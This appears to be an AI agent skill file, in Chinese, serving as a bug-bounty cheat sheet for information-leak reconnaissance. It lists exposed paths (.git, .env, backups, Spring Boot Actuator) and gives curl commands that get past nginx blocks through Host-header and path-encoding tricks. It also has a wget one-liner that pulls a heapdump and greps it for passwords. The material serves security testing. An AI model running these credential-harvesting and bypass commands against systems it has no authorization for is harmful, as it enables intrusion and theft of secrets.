---
name: info-leak
description: 信息泄露速查——30个常见泄露路径+JS分析+Swagger/Actuator探测。Use when 目标指纹未知/找攻击面/JS里挖配置。
---

# 信息泄露 & 攻击面发现

> 蒸馏自CC挖洞武器库 info-leak-pwn + hidden-gaps（实战验证）

## 30秒目录速查

```bash
# 常见泄露路径（全部试一遍）
/.git/HEAD  /.git/config           # Git泄露（可还原源码）
/.svn/entries                      # SVN泄露
/backup.zip  /www.zip  /web.zip    # 备份文件
/.env  /config.php.bak  /db.sql    # 配置/数据库备份
/swagger-ui.html  /v2/api-docs     # Swagger
/actuator  /actuator/env  /actuator/heapdump  # SpringBoot
/druid/index.html                  # Druid监控
/robots.txt  /sitemap.xml          # 隐藏路径线索
/.DS_Store                         # macOS目录索引
/phpinfo.php                       # PHP信息
/server-status  /server-info       # Apache状态
```

## JS 静态分析（高价值）

```bash
# 抓JS → 提取API路径/域名/硬编码密钥
curl -s "http://T/" | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//'
# 批量抓JS后搜
grep -rE "accessKey|secret|apiKey|token|password" *.js
grep -rE "https?://[a-z0-9.-]+\.(com|cn|net)" *.js   # 内网域名
grep -rE "/api/[a-z0-9/_-]+" *.js                     # API路径
# 内网IP泄露
grep -rE "10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\." *.js
```

## SpringBoot Actuator 专项

```bash
# 探测（2.x=/actuator前缀）
curl http://T:12005/actuator
# nginx拦截绕过
curl http://T:1443/actuator/env        # Tomcat直连端口
curl -H "Host: localhost" http://T/actuator/env
curl "http://T//env/./env/%65nv"       # 路径变形
# /env提凭证：OSS AK/SK、DB密码、Redis、Eureka
# heapdump：⚠️ gzip压缩！解压后strings搜密码
wget http://T/actuator/heapdump -O heap.gz && gunzip heap.gz && strings heap.hprof | grep -i password
# 自定义OSS端点比/env更危险（明文AK/SK）：/fileOss/getOssConfig
```

## 定级参考

| 泄露 | 定级 |
|---|---|
| AK/SK、DB密码、云凭证 | 中危 |
| 内网IP+端口拓扑 | 中危 |
| Git源码可还原 | 中危-高危 |
| 仅版本号/服务名 | 低危（SRC不收） |
| heapdump敏感信息 | 低危 |

## 提交要点

- 有攻击链（泄露→利用）才算危害，纯目录列表=低危可能不收
- AK/SK必须实测（列桶成功）才算实锤
